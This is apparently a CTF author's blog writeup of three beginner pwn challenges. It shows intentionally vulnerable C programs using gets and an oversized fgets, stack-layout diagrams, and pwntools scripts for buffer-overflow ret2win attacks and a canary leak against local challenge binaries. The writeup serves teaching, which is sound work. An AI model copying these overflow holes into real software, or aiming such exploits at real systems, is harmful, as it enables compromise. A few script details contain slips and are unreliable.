---
id: 20
title: "Hackbash Finals CTF 2024: Author's Writeup (pwn)"
subtitle: "Full Buffer Developer | Stackrunning 2077 | To (not) kill a canary"
date: "2024.03.16"
tags: "hackbash, aycep, greyhats, ctf"
---

## Foreword

These were the beginner pwn challenges that I created for Hackbash Finals CTF 2024.

I would like to preface this by saying that even though I refer to these as beginner pwn challenges, it only applies only when looking at pwn challenges as a whole. Personally, I am really proud of the Hackbash participants for attempting these challenges. Starting with near zero knowledge on pwn and attempting these challenges after a simple 3-hour OS/Pwn workshop takes a lot of courage (pwn is not easy to start learning!), because the concepts explored in pwn can get quite advanced, especially for people with little to no low-level programming (stack manipulation, memory addressing etc.) background.

For the following challenges, in the context of the CTF, 🍼 denotes that it is an easy challenge, no emoji denotes that it is an intermediate challenge, while 💀 denotes that it is a hard challenge. For context, there were 19 teams in total for the CTF.

In the following writeups, I will go into as much detail as possible into the pwn concepts behind each of the challenges and also provide an example thought process for solving them.

Actually, there was an error on my part on the deployment of the challenges which made them easier than what was intended, and I will also discuss that in the respective challenge explanations.

For all the following challenges, we would be using `win+5`, I will explain at the end why this is the case in case anyone is interested.

# Full Buffer Developer 🍼 | 17 solves

Sure enough, this was an easy pwn challenge and most teams solved it. Let's take a look at the source code first:
```c
#include <stdio.h>
#include <stdlib.h>

int win() {
    printf("Good job :)\n");
    system("cat flag.txt");
    return 0;
}

int main() {
    char name[0x10];
    //fix buffer for remote
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    printf("Is this stack overflow?\n");
    printf("Enter username:\n");
    fgets(name, 0x20, stdin);
    printf("Access denied >:(\n");
    return 0;
}
```

This is a short C program, let's take a closer look at what each part of the code is trying to do.

We can immediately see that there is a `win()` function, which prints "Good job :)" and then calls `system("cat flag.txt")`, so this is the function we are supposed to reach. Hence, this is a ret2win challenge.

In the main function, we see a `char name[0x10]` being declared, which essentially is declaring a variable of type `char`, of name `name`, and of size `0x10`. Keep in mind that `0x10` is NOT `10`! `0x10` is in _hexadecimal_, which means that it is base 16 and not base 10.

We can ignore the `setbuf()` lines.

This part of the code asks for a user input, and takes it in with `fgets()`.
```c
printf("Is this stack overflow?\n");
printf("Enter username:\n");
fgets(name, 0x20, stdin);
printf("Access denied >:(\n");
```

However, recalling that the variable `name` is of size `0x10`, but `fgets()` is reading `0x20` characters into `name`, we can see that this is a buffer overflow challenge.

The layout of the stack at this point looks something like this:
```
------------------------
|      name[0x10]      |
------------------------
|      $rbp[0x08]      |
------------------------
| return pointer[0x08] |
------------------------
```

The return pointer is actually represented (specifically, in Intel x86_64) as $rip, which stands for (R) Instruction Pointer.

So with this knowledge in mind, we know that the first `0x10` bytes will fill up `name`, the next `0x8` bytes will overwrite (i.e. "fill up") `$rbp`, and the last `0x8` bytes will overwrite the `$rip` (return pointer).

Hence, our target payload should be something like: `0x10` (i.e. 16) bytes to fill up `name`, followed by `0x8` (i.e. 8) bytes to fill up `$rbp`, and the last `0x8` (i.e. 8) bytes to overwrite `$rip`.

If we make use of pwntools, the script would look something like this:
```py
from pwn import *

# Start process
p = process("./full_buffer_developer")
# You would use something like
# p = remote("some.providedwebsite.org", port_number)
# replacing the website with the one we provided,
# and port_number similarly with the one we provided

# constructing the payload
pad = b'a'*0x10     # to fill up "name"
rbp = b'b'*8        # to fill up the rbp
win = p64(0x4011CD) # to overwrite rip with the address of win()

payload = pad+rbp+win # form the payload!

# Easy buffer overflow
p.sendlineafter(b':', payload)
# recv until "flag{", because this is when we
# know for sure we are receiving the flag
p.recvuntil("flag{")
# receive the rest of the flag and append
# "flag{" in front
print("flag{"+p.recvall())
# this isn't necessary, but I like to clean
# my output for a model solution :)
```

# Stackrunning 2077 | 7 solves

This was a slightly harder buffer overflow challenge. And fun fact: I was supposed to release a source file with redacted variable values, but instead I mixed it up and released the full original source code. However, this shouldn't have affected the way it is solved.

For the purpose of learning the intended proper "pwn" way of thinking, I will be using source code with redacted values below.

First let's take a look at the source code (with redacted values).
```c
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int setup() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
}

int secret() {
    printf("You have reached the data core!\n");
    system("cat flag.txt");
}

int stackrunner() {
    char watchdog[0x10] = "[REDACTED]";
    char verify[0x10] = "[REDACTED]";
    char checker[0x10] = "[REDACTED]";
    char mark2[0x10] = "[REDACTED]";
    char password[0x10] = "[REDACTED]";
    char mark[0x10] = "[REDACTED]";
    char input[0x10];

    printf("\033[0;93mEntering hackbash secure space...\n\n\n");
    sleep(1);

    printf("██╗░░██╗░█████╗░░█████╗░██╗░░██╗██████╗░░█████╗░░██████╗██╗░░██╗  ░██████╗███████╗░█████╗░██╗░░░██╗██████╗░███████╗\n");
    printf("██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔══██╗██╔══██╗██╔════╝██║░░██║  ██╔════╝██╔════╝██╔══██╗██║░░░██║██╔══██╗██╔════╝\n");
    printf("███████║███████║██║░░╚═╝█████═╝░██████╦╝███████║╚█████╗░███████║  ╚█████╗░█████╗░░██║░░╚═╝██║░░░██║██████╔╝█████╗░░\n");
    printf("██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══██╗██╔══██║░╚═══██╗██╔══██║  ░╚═══██╗██╔══╝░░██║░░██╗██║░░░██║██╔══██╗██╔══╝░░\n");
    printf("██║░░██║██║░░██║╚█████╔╝██║░╚██╗██████╦╝██║░░██║██████╔╝██║░░██║  ██████╔╝███████╗╚█████╔╝╚██████╔╝██║░░██║███████╗\n");
    printf("╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝  ╚═════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░░╚═╝╚══════╝\n\n");
    printf("░██████╗██████╗░░█████╗░░█████╗░███████╗\n");
    printf("██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝\n");
    printf("╚█████╗░██████╔╝███████║██║░░╚═╝█████╗░░\n");
    printf("░╚═══██╗██╔═══╝░██╔══██║██║░░██╗██╔══╝░░\n");
    printf("██████╔╝██║░░░░░██║░░██║╚█████╔╝███████╗\n");
    printf("╚═════╝░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░╚══════╝\n");

    printf("\n\n\033[0;39mPlease enter your input: ");
    gets(input);

    printf("\nVerifying...\n");
    if (strncmp(input, password, 16)) {
        printf("\033[0;31mPassword is wrong, stackrunning failed.\033[0;39m\n");
        exit(1);
    }

    if (strncmp(mark, mark2, 16)) {
        printf("\033[0;31mMark verification failed, stackrunning failed.\033[0;39m\n");
        exit(1);
    }

    if (strncmp(checker, "OWEa8iZOfQIFQyl1", 16)) {
        printf("\033[0;31mIntrusion detected, stackrunning failed.\033[0;39m\n");
        exit(1);
    }

    if (strncmp(watchdog, "CHhMf9iW0F21LC74", 16)) {
        printf("\033[0;31mWatchdog alerted, stackrunning failed.\033[0;39m\n");
        exit(1);
    }

    if (strncmp(verify, password, 16)) {
        printf("\033[0;31mPassword modified, stackrunning failed.\033[0;39m\n");
        exit(1);
    }

    printf("\nVerification complete. User does not have access to requested file.\n");
    printf("Exiting...\n");
}

int main() {
    setup();
    stackrunner();
}
```

It might seem like a long block of code at first, but most of it is really just printing strings. Let's simplify the code a bit and break it down.

We can see a `secret()` function that calls `system("cat flag.txt")`. This is the function that we want to reach! This is another ret2win challenge.

We look at the following part of the code, it declares some variables:
```c
char watchdog[0x10] = "[REDACTED]";
char verify[0x10] = "[REDACTED]";
char checker[0x10] = "[REDACTED]";
char mark2[0x10] = "[REDACTED]";
char password[0x10] = "[REDACTED]";
char mark[0x10] = "[REDACTED]";
char input[0x10];
```

The variables will be declared and pushed onto the stack sequentially, hence `watchdog` would be at the bottom of the stack whereas `input` would be at the top of the stack. We will get back to this later.

This part of the code takes in a user input and stores it into `input`, however it does not limit the number of characters that you can input, which leads to a buffer overflow vulnerability:
```c
printf("\n\n\033[0;39mPlease enter your input: ");
gets(input);
```

In these following parts of the code, we can see that a few checks need to be passed:
```c
if (strncmp(input, password, 16)) {
    printf("\033[0;31mPassword is wrong, stackrunning failed.\033[0;39m\n");
    exit(1);
}
```
`input` must be equals to `password`
```c
if (strncmp(mark, mark2, 16)) {
    printf("\033[0;31mMark verification failed, stackrunning failed.\033[0;39m\n");
    exit(1);
}
```
`mark` must be equals to `mark2`
```c
if (strncmp(checker, "OWEa8iZOfQIFQyl1", 16)) {
    printf("\033[0;31mIntrusion detected, stackrunning failed.\033[0;39m\n");
    exit(1);
}
```
`checker` must be equals to the string "`OWEa8iZOfQIFQyl1`"
```c
if (strncmp(watchdog, "CHhMf9iW0F21LC74", 16)) {
    printf("\033[0;31mWatchdog alerted, stackrunning failed.\033[0;39m\n");
    exit(1);
}
```
`watchdog` must be equals to the string "`CHhMf9iW0F21LC74`"
```c
if (strncmp(verify, password, 16)) {
    printf("\033[0;31mPassword modified, stackrunning failed.\033[0;39m\n");
    exit(1);
}
```
`verify` must be equals to `password`

With these conditions in mind, let's visualize our stack layout. Remember as discussed earlier, the variables are pushed onto the stack sequentially. From hereon out, I will be referring to the return pointer as `$rip`.
```
------------------------
|     input[0x10]      |
------------------------
|      mark[0x10]      |
------------------------
|    password[0x10]    |
------------------------
|     mark2[0x10]      |
------------------------
|    checker[0x10]     |
------------------------
|     verify[0x10]     |
------------------------
|    watchdog[0x10]    |
------------------------
|      $rbp[0x08]      |
------------------------
|      $rip[0x08]      |
------------------------
```

Hence, as we have a buffer overflow and we start writing from `input`, we will write in the order as shown above. The payload would hence be:
```
"a" x 16 to fill up input
          +
"a" x 16 to fill up mark
          +
"a" x 16 to fill up password
-- this will fulfill the input = password check,
-- as both are equals to "a" x 16
          +
"a" x 16 to fill up mark2
-- this will fulfill the mark = mark2 check,
-- as both are equals to "a" x 16
          +
"OWEa8iZOfQIFQyl1" to fill up checker
-- this will fulfill the checker string compare check
          +
"a" x 16 to fill up verify
-- this will fulfill the verify = password check,
-- as both are equals to "a" x 16
          +
"CHhMf9iW0F21LC74" to fill up watchdog
-- this will fulfill the watchdog string compare check
          +
"a" x 8 to fill up $rbp
          +
address of secret() to fill up $rip
```

The recommended method is to use `gdb` debugger in order to disassemble `secret()` in order to find its address. Now that we know the structure of the payload, we just need to put it into python and send it to our server.

With pwntools, the script would look something like this:
```py
from pwn import *

# Run binary
p = process("./challenge")
# You would use something like
# p = remote("some.providedwebsite.org", port_number)
# replacing the website with the one we provided,
# and port_number similarly with the one we provided

# building the payload
payload = b"a"*16                # input
payload += b"a"*16               # mark
payload += b"a"*16               # mark 2
payload += b"a"*16               # password
payload += b"OWEa8iZOfQIFQyl1"   # checker
payload += b"a"*16               # verify
payload += b"CHhMf9iW0F21LC74"   # watchdog
payload += b"a"*8                # rbp
payload += p64(0x40124e)         # secret()

p.sendlineafter(b'input: ', payload)
# recv until "flag{", because this is when we
# know for sure we are receiving the flag
p.recvuntil("flag{")
# receive the rest of the flag and append
# "flag{" in front
print("flag{"+p.recvall())
# this isn't necessary, but I like to clean
# my output for a model solution :)
```

# To not kill a canary 💀 | 1 solve

I was quite surprised that someone solved it as for all intents and purposes of Hackbash Finals CTF, this was meant to be an extremely hard or even unsolveable challenge. I did give a big hint near the end to try to get some people to solve it as I saw quite a few teams attempting this when I was walking around. Kudos to anyone that even attempted this, this was definitely a behemoth of a challenge. I will try to break down each part of the code as clearly as I can.

Similarly to the previous challenge, I was supposed to release a source file with redacted variable values, but instead I mixed it up and released the full original source code. However, this similarly shouldn't have affected the way it is solved very much.

Also similarly to the previous challenge, for the purpose of learning the intended proper "pwn" way of thinking, I will be using source code with redacted values below.

This is the source file:
```c
#include <stdio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int setup() {
    setbuf(stdin, 0);
    setbuf(stdout, 0);
}

int escape() {
    printf("My canary has escaped!\n");
    system("cat flag.txt");
}

int pet() {
    printf("You pet the canary :)\n");
    printf("\n\n\n\n");
    cage();
}

int talk() {
    char input[0x10];
    char password[0x10] = "[REDACTED]";

    printf("What do you want to say?\n");
    fgets(input, 0x30, stdin);
    if (!strncmp(input, password, 16)) {
        printf("Here's the canary!\n");
        printf("%11$p");
    } else {
        printf("The canary echoes back what you said:\n%s\n", input);
    }
    printf("\n\n\n\n");
    cage();
}

int poison() {
    char input[0x10];

    printf("Input your poison:\n");
    gets(input);
}

int cage() {
    char input[4];
    int choice;
    printf("\033[0;33m");
    printf("▀█▀ █▀█  \033[0;31m ▄▀ █▄░█ █▀█ ▀█▀ ▀▄ \033[0;33m  █▄▀ █ █░░ █░░   ▄▀█   █▀▀ ▄▀█ █▄░█ ▄▀█ █▀█ █▄█\n");
    printf("░█░ █▄█  \033[0;31m ▀▄ █░▀█ █▄█ ░█░ ▄▀ \033[0;33m  █░█ █ █▄▄ █▄▄   █▀█   █▄▄ █▀█ █░▀█ █▀█ █▀▄ ░█░\n");
    printf("\n");
    printf("\033[1;36mDid you know? Canaries were used in history\n");
    printf("as an early warning for toxic gases, as the birds are\n");
    printf("sensitive to toxic gases! Here is my pet canary...\n");
    printf("\n");
    //printf("\033[0;32m");
    printf("--------------------------------\n");
    printf("|                              |\n");
    printf("|    What do you want to do?   |\n");
    printf("|      1. Talk to canary       |\n");
    printf("|      2. Pet the canary       |\n");
    printf("|      3. Test for poison!     |\n");
    printf("|                              |\n");
    printf("--------------------------------\n");
    printf("Option: ");
    fgets(input, 4, stdin);
    choice = atoi(input);
    switch (choice) {
        case 1:
            talk();
            break;
        case 2:
            pet();
            break;
        case 3:
            poison();
            break;
        default:
            printf("\nInvalid choice!\n");
            cage();
    }
}

int main() {
    setup();
    cage();
}
```

This is quite a long piece of code, so we should analyze it bit by bit. First, let's look at the `main()` function, as it is the entry point of every C program.
```c
int main() {
    setup();
    cage();
}
```

It calls `setup()` and `cage()`. `setup()` we can ignore as it doesn't really do anything of note. In case you're curious, this is to flush the buffers (in order to make the challenge work properly).

`cage()` is as shown below, omitting most of the `print` statements:
```c
int cage() {
    char input[4];
    int choice;
    ...
    printf("Option: ");
    fgets(input, 4, stdin);
    choice = atoi(input);
    switch (choice) {
        case 1:
            talk();
            break;
        case 2:
            pet();
            break;
        case 3:
            poison();
            break;
        default:
            printf("\nInvalid choice!\n");
            cage();
    }
}
```

We can see that 2 variables are defined at the start of the code, then it asks for the user to choose an option. Afterwards, according to the user's input, it will call a certain function.
- 1 will call `talk()`
- 2 will call `pet()`
- 3 will call `poison()`
- any other option will print "invalid choice!" and call `cage()` again

The variables `input` and `choice` are not exploitable as there is no buffer overflow in the user input parsing.

In order to understand each user option, we have to look at their corresponding function.

The function `pet()` is the easiest, it doesn't actually do anything of note:
```c
int pet() {
    printf("You pet the canary :)\n");
    printf("\n\n\n\n");
    cage();
}
```

As we can see, all it does is print a string and then call `cage()` again.

Things get interesting when we look at `talk()`:
```c
int talk() {
    char input[0x10];
    char password[0x10] = "[REDACTED]";

    printf("What do you want to say?\n");
    fgets(input, 0x30, stdin);
    if (!strncmp(input, password, 16)) {
        printf("Here's the canary!\n");
        printf("%11$p");
    } else {
        printf("The canary echoes back what you said:\n%s\n", input);
    }
    printf("\n\n\n\n");
    cage();
}
```

Talk defines 2 variables: `input[0x10]` and `password[0x10]`. However, when it is accepting user input with `fgets()`, it allows up to `0x30` characters to be inputted, whereas the size of `input` is only `0x10`. This leads to a buffer overflow vulnerability.

We can see that there is a string compare in the next part of the code. It checks that if `input` is equals to `password`, it will print "here's the canary" and then provide the canary. If not, it will simply echo your input.

The stack in this function would look something like:
```
------------------------
|     input[0x10]      |
------------------------
|    password[0x10]    |
------------------------
|      $rbp[0x08]      |
------------------------
|      $rip[0x08]      |
------------------------
```

In order to pass the `input` = `password` check, we can send something like
```
"a" x 16 to fill up input
            +
"a" x 16 to fill up password
-- this will fulfill input = password
-- as both will be "a" x 16
```

This will overwrite both `input` and `password` with the same thing ("a" x 16), and hence pass the check and give us the canary.

Finally, the function calls `cage()` again.

Actually, with just this function, we are already able to solve the challenge, but let's take a look at `poison()` as well:
```c
int poison() {
    char input[0x10];

    printf("Input your poison:\n");
    gets(input);
}
```

This is quite a straightforward function, as all it does is provide a buffer overflow. As you can see, it lets you input any amount of characters you want into `input[0x10]`.

This might be clearer to see and use for your final exploit than `talk()`, so I will be using this function in the final exploit.

The stack in this function would look something like:
```
------------------------
|     input[0x10]      |
------------------------
|      $rbp[0x08]      |
------------------------
|    canary[0x10]      |
------------------------
|      $rbp[0x08]      |
------------------------
|      $rip[0x08]      |
------------------------
```

Notice where the canary is placed within this function. Actually, this can be visualizable if we open the program in the `gdb` debugger.

What we can do is to set a breakpoint right after our user input, and then "examine" the stack when our program hits the breakpoint. We can do so with the following `gdb` commands/program inputs:
```
-> to set breakpoint
b *address_right_after_gets_call
(replace with the address as seen in gdb)

-> to run the executable
r

-> put in a recognizable input
abcd
(this will show up as 0x64636261 in your stack!)

-> after hitting breakpoint, inspect the stack
x/30x $rsp
```

What the `x/30x $rsp` does is essentially, `x` is to examine a specified thing, `/30x` says that you want to view up to length 30 in hexadecimal, and `$rsp` is saying that you want to examine 30 bytes from the `$rsp`, which if you recall is your stack pointer that points to the top of the stack. This command hence displays your stack up to around 30 bytes.

Hence, in order to win with this function, we just need to overwrite `input`, followed by `$rbp`, followed by the canary, followed by `$rbp` again, then overwrite `$rip` with whatever address we need.

Our payload would hence look something like:
```
        "a" x 16 to fill up input
                    +
        "a" x 8 to fill up $rbp
                    +
      canary value to fill up canary
                    +
        "a" x 8 to fill up $rbp
                    +
whatever address we need to overwrite $rip
```

There is also one more function that exists within the source code that will be important to us:
```c
int escape() {
    printf("My canary has escaped!\n");
    system("cat flag.txt");
}
```

This is our win function as it calls `system("cat flag.txt")` for us.

Let's break down what we know:
- `talk()` leaks the canary for us if we fulfill the condition of `input` = `password`
- `poison()` lets us perform a buffer overflow attack
- `escape()` is the function we want to call in order to win

If we chain all our knowledge for exploiting each of the functions together, we will need to:
1. Input option 1 to call `talk()`
2. Send our payload for `talk()`
3. Retrieve the printed canary value and save it
4. Input option 3 to call `escape()`
5. Send our payload for `escape()`

With pwntools, our script would look something like this:
```py
from pwn import *

# Run binary
p = process("./challenge")
# You would use something like
# p = remote("some.providedwebsite.org", port_number)
# replacing the website with the one we provided,
# and port_number similarly with the one we provided

win = 0x40128e  # the address value of win+5

# select option 1
p.sendlineafter(b"Option: ", b"1")
# send payload for talk(), which is
# "a" x 32
p.sendlineafter(b"say?\n", b"a"*32)
# receive until "canary!\n"
# then grab the canary value
p.recvuntil(b"canary!\n")
canary = int(p.recvline().strip(), 16)
# for debugging purposes, you can print
# the value to check
print(f"{hex(canary) = }")

# select option 3
p.sendlineafter(b"Option: ", b"3")

# build our payload for escape()
payload = flat({0x10: p64(0)+p64(canary)+p64(0)+p64(win)})
# send the payload
p.sendlineafter(b"poison:\n", payload)
# recv until "flag{", because this is when we
# know for sure we are receiving the flag
p.recvuntil("flag{")
# receive the rest of the flag and append
# "flag{" in front
print("flag{"+p.recvall())
# this isn't necessary, but I like to clean
# my output for a model solution :)
```

This challenge is definitely a huge step up from the rest of the OS/Pwn content covered in Hackbash, but hopefully everyone who attempted this can now learn something new :)

I know it's definitely a lot to get your head wrapped around, but if you slowly understand what the code is trying to do, it will become a lot easier.

## Extra Notes

Firstly, for the `win+5` address, this is because `system()` actually requires a properly aligned stack in order to function properly. Since we overwrote our `$rbp` with a bogus value, when we first go into the function and it reaches the `push rbp` instruction, it will end up pushing our bogus `$rbp`, which we do not want. If you attach a debugger to the application, you can see that it crashes at the `movaps` instruction. Usually, the program would naturally handle the stack alignment in its execution flow. However, since we are overwriting values in the stack and messing with the program, we overwrote the `$rbp` with our own bogus value, when the program jumps to the start of another function it tries to "return" our `$rsp` to the bogus `$rbp` (i.e. at the `push rbp` instruction), which causes it to be set to the bogus value. This causes the `$rsp` to be misaligned and hence when `movaps` uses our `$rsp` value it will end up faulting. Hence, by calling `win+5`, we skip the `push rbp` instruction and mitigate the problem.

There are more information on the above in [here (instruction set reference)](https://www.felixcloutier.com/x86/movaps) and [here (explanation of `movaps` in the context of pwn)](https://ropemporium.com/guide.html#Common%20pitfalls) if you are interested in the specifics.

Also, it is definitely good to learn how to use `gdb` as it is a huge part of pwn challenges. There are many guides written for using `gdb`, and definitely use a plugin such as `gef` or `pwndbg` as they provide functions that make it easier to play around with the application.

## Afterword

I hope this was overall a fun activity for all Hackbash finalists as we have put a lot of effort to ensure as smooth sailing of an experience as possible. In the creation of our challenges, we strived to find the balance between difficulty and solvability.

If you are interested in pwn, do feel free to check out my earlier writeups on my blog where I talked about some [easy pwn challenges in RedPwnCTF 2020](https://ultimatehg.github.io/article/0.html) as well as the [pwn challenges in Greyhats WelcomeCTF 2023](https://ultimatehg.github.io/article/14.html), which should include a few easier pwn challenges.